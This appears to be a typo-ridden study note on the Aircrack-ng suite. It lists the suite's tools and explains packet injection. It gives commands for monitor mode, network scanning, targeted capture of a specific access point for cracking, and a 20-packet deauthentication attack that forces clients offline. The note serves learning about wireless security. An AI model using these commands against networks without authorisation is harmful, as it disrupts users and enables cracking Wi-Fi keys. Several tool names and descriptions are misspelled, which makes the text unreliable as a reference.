
# AirCrack-Ng Tool
- Aircrak-ng is not a signle tool, but  rather a suit of tools for manipu;ating and craking wifi networks
    
    - Airmon-ng
          
          - Placing different cards in monitor mode.
    - aircrack-nh
          
          - Wireless key cracking program
     - aurodump-ng
     
            - Packet sniffer

     - aireplay-ng
     
            - Packet injector
     - airbase-ng 
    
           - config dake access points
    
     - airdecap-ng 


            - decrypt WEP/WPA/WPA2 encryption

## Packet Injection

 <P> Packet injection allow to intercept, disrupt and manipulate netwoek communication.
  packet injection is commonly used in man-in-the-middle attacks
  
  An example of this is sending a deautentication packets from an unknown party outside the network to a connected client as
  id it as  send by the wireless router. This will result in the client disconnecting from the router.
  </P>
  
  ### Recommended use wireless cards
    - ALFA AWUS06H
    - TP-LINK WN722N
    - ALFA AWUS036NHA
  
  ### To test network adopter for packet injection
  ```bash
  aireplay-ng -9 wlx
  ```
  
  ### Put wireless card in monitor mode
  ```bash
  sudo airmon-ng start wlx
  ```
  - To kill the process 
  ```
  airmon-ng check kill
  ```
  - To check the monitor mode
  ```
  iwconfig
  ```
- To list the wireless network arround you
```bash
airodump-ng wlx
```
- TO crak a specific network
```
└──╼ #airodump-ng -c 7 --bssid 28:DE:E5:BA:BC:C8 wlx502b73a0015b
```
- Force client to dissconnect
```
└──╼ #aireplay-ng -0 20 -a 28:DE:E5:BA:BC:C8 wlx502b73a0015b
```



  
    
